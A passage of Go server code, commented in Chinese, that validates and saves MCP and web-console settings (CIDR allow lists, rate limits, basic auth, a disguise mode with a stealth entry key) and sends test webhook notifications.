			cidrs := make([]string, 0, len(*mu.AllowedCIDRs))
			for _, raw := range *mu.AllowedCIDRs {
				c := strings.TrimSpace(raw)
				if c == "" {
					continue
				}
				if _, _, err := net.ParseCIDR(c); err != nil {
					if net.ParseIP(c) == nil {
						http.Error(w, fmt.Sprintf(`{"error":"allow_cidrs 里的 %q 既不是 CIDR 也不是 IP"}`, c), http.StatusBadRequest)
						return
					}
				}
				cidrs = append(cidrs, c)
			}
			updates["mcp.allow_cidrs"] = cidrs
			hot = false
		}
		if mu.MaxRPM != nil {
			if *mu.MaxRPM < 0 {
				http.Error(w, `{"error":"mcp.max_rpm 不能为负（留 0 或负数表示用默认 60）"}`, http.StatusBadRequest)
				return
			}
			updates["mcp.max_rpm"] = *mu.MaxRPM
			hot = false
		}
		if mu.MaxConcurrent != nil {
			if *mu.MaxConcurrent <= 0 || *mu.MaxConcurrent > 64 {
				http.Error(w, `{"error":"mcp.max_concurrent 需在 1~64 之间"}`, http.StatusBadRequest)
				return
			}
			updates["mcp.max_concurrent"] = *mu.MaxConcurrent
			hot = false
		}
		if mu.MaxPendingHandles != nil {
			if *mu.MaxPendingHandles <= 0 || *mu.MaxPendingHandles > 4096 {
				http.Error(w, `{"error":"mcp.max_pending_handles 需在 1~4096 之间"}`, http.StatusBadRequest)
				return
			}
			updates["mcp.max_pending_handles"] = *mu.MaxPendingHandles
			hot = false
		}
		if mu.InlineLimit != nil {
			if *mu.InlineLimit < 512 {
				http.Error(w, `{"error":"mcp.inline_limit 太小（建议 >= 2048）"}`, http.StatusBadRequest)
				return
			}
			updates["mcp.inline_limit"] = *mu.InlineLimit
			hot = false
		}
		if mu.ResultDir != nil {
			updates["mcp.result_dir"] = strings.TrimSpace(*mu.ResultDir)
			hot = false
		}
		if mu.ResultTTL != nil {
			d, err := time.ParseDuration(strings.TrimSpace(*mu.ResultTTL))
			if err != nil || d <= 0 {
				http.Error(w, `{"error":"mcp.result_ttl 非法（示例: 24h）"}`, http.StatusBadRequest)
				return
			}
			updates["mcp.result_ttl"] = d.String()
			hot = false
		}
		if mu.AuditPath != nil {
			updates["mcp.audit_path"] = strings.TrimSpace(*mu.AuditPath)
			hot = false
		}
		if mu.FailClosed != nil {
			updates["mcp.fail_closed"] = *mu.FailClosed
			hot = false
		}
	}

	// ── Web 控制台防护（防测绘）段 ──
	if wu := upd.Web; wu != nil {
		cur := config.Get()
		curUser := ""
		curHash := ""
		curEnabled := false
		if cur != nil {
			curUser, curHash, curEnabled = cur.Web.BasicAuthUser, cur.Web.BasicAuthPassword, cur.Web.BasicAuthEnabled
		}
		newUser := curUser
		newHash := curHash

		if wu.BasicAuthUser != nil {
			newUser = strings.TrimSpace(*wu.BasicAuthUser)
			if newUser == "" {
				http.Error(w, `{"error":"basic_auth_user 不能为空"}`, http.StatusBadRequest)
				return
			}
			updates["web.basic_auth_user"] = newUser
		}
		if wu.NewPassword != nil && *wu.NewPassword != "" {
			if len(*wu.NewPassword) < 8 {
				http.Error(w, `{"error":"Basic 认证密码至少 8 位"}`, http.StatusBadRequest)
				return
			}
			hashed, herr := auth.HashPassword(*wu.NewPassword)
			if herr != nil {
				http.Error(w, `{"error":"密码哈希失败"}`, http.StatusInternalServerError)
				return
			}
			newHash = hashed
			updates["web.basic_auth_password"] = hashed
		}
		if wu.UnauthMode != nil {
			m := strings.ToLower(strings.TrimSpace(*wu.UnauthMode))
			if m != "basic" && m != "disguise" {
				http.Error(w, `{"error":"unauth_mode 仅支持 disguise / basic"}`, http.StatusBadRequest)
				return
			}
			updates["web.unauth_mode"] = m
		}
		if wu.DecoyTitle != nil {
			updates["web.decoy_title"] = strings.TrimSpace(*wu.DecoyTitle)
		}
		if wu.AllowCIDRs != nil {
			cleaned := []string{}
			for _, c := range *wu.AllowCIDRs {
				c = strings.TrimSpace(c)
				if c == "" {
					continue
				}
				if _, _, err := net.ParseCIDR(c); err != nil && net.ParseIP(c) == nil {
					http.Error(w, fmt.Sprintf(`{"error":"allow_cidrs 项非法: %s"}`, c), http.StatusBadRequest)
					return
				}
				cleaned = append(cleaned, c)
			}
			updates["web.allow_cidrs"] = cleaned
		}
		if wu.BasicAuthEnabled != nil {
			// 防自锁：开启时必须已有可用凭据（用户名 + 已设置密码）
			if *wu.BasicAuthEnabled && (newUser == "" || newHash == "") {
				http.Error(w, `{"error":"开启基础认证前请先填写用户名与密码（密码至少 8 位）"}`, http.StatusBadRequest)
				return
			}
			updates["web.basic_auth_enabled"] = *wu.BasicAuthEnabled
			if *wu.BasicAuthEnabled && !curEnabled {
				logging.Info("api", "Web basic auth enabled (unauth_mode=%s)", func() string {
					if wu.UnauthMode != nil {
						return strings.ToLower(strings.TrimSpace(*wu.UnauthMode))
					}
					if cur != nil {
						return cur.Web.UnauthMode
					}
					return "disguise"
				}())
			}
		}
		// 隐蔽入口密钥：disguise 模式下浏览器进入控制台的通道
		if wu.StealthKey != nil {
			k := strings.TrimSpace(*wu.StealthKey)
			switch {
			case k == "":
				updates["web.stealth_key"] = ""
			case strings.EqualFold(k, "regenerate"):
				gen, gerr := auth.GenerateStealthKey()
				if gerr != nil {
					http.Error(w, `{"error":"生成隐蔽入口密钥失败"}`, http.StatusInternalServerError)
					return
				}
				updates["web.stealth_key"] = gen
				updates["_new_stealth_key"] = gen // 仅本次响应回传，供前端展示一次
			default:
				if len(k) < 16 {
					http.Error(w, `{"error":"隐蔽入口密钥至少 16 位（建议直接用「生成」按钮）"}`, http.StatusBadRequest)
					return
				}
				updates["web.stealth_key"] = k
			}
		}
	}

	if len(updates) == 0 {
		http.Error(w, `{"error":"没有可保存的配置项"}`, http.StatusBadRequest)
		return
	}

	// 轮换产生的新 key 不写入配置文件（仅一次性返回给前端展示）
	var newAPIKey string
	if v, ok := updates["_new_api_key"].(string); ok {
		newAPIKey = v
		delete(updates, "_new_api_key")
	}
	var newStealthKey string
	if v, ok := updates["_new_stealth_key"].(string); ok {
		newStealthKey = v
		delete(updates, "_new_stealth_key")
	}

	if err := config.Save(updates); err != nil {
		logging.Error("settings", "save config failed: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"保存配置失败: %v"}`, err), http.StatusInternalServerError)
		return
	}

	// 热应用：认证配置立即替换（新密码/用户名即刻生效）
	cfg := config.Get()
	if cfg != nil {
		s.auth.Update(&cfg.Auth)
	}

	// 通知服务器主循环（listener 拟态等组件热更新）
	if s.onConfigApplied != nil {
		s.onConfigApplied(cfg)
	}

	resp := map[string]interface{}{
		"message": "设置已保存",
		"hot":     hot,
	}
	if newAPIKey != "" {
		resp["new_api_key"] = newAPIKey
		resp["warning"] = "请立即保存该 API Key，关闭后不再显示"
	}
	if newStealthKey != "" {
		// 仅本次响应回传隐蔽入口密钥；入口链接与密钥请立即保存
		resp["new_stealth_key"] = newStealthKey
		resp["stealth_entry"] = "/__gate?k=" + newStealthKey
		resp["warning"] = "请立即保存该隐蔽入口链接（含密钥），关闭后不再显示；disguise 模式下用它进入控制台"
	}
	logging.Info("settings", "settings saved (hot=%v, %d keys)", hot, len(updates))
	json.NewEncoder(w).Encode(resp)
}

func contains(list []string, v string) bool {
	for _, x := range list {
		if x == v {
			return true
		}
	}
	return false
}

// testWebhookHandler 立即发送一条测试通知到指定 webhook（设置页"发送测试"）。
// 请求体：{url, content, format, secret}（secret 为钉钉加签密钥，可选）。
func (s *Server) testWebhookHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	var req struct {
		URL     string `json:"url"`
		Content string `json:"content"`
		Format  string `json:"format"`
		Secret  string `json:"secret"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.URL == "" {
		http.Error(w, `{"error":"url 必填"}`, http.StatusBadRequest)
		return
	}
	if !strings.HasPrefix(req.URL, "http://") && !strings.HasPrefix(req.URL, "https://") {
		http.Error(w, `{"error":"url 非法"}`, http.StatusBadRequest)
		return
	}

	result, err := webhook.SendTest(req.URL, req.Content, req.Format, req.Secret)
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"发送失败: %v"}`, err), http.StatusBadGateway)
		return
	}
	json.NewEncoder(w).Encode(map[string]interface{}{
		"ok":          result.OK,
		"platform":    result.Platform,
		"status_code": result.StatusCode,
		"response":    result.Response,
		"error":       result.Error,
	})
}

func truncateStr(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
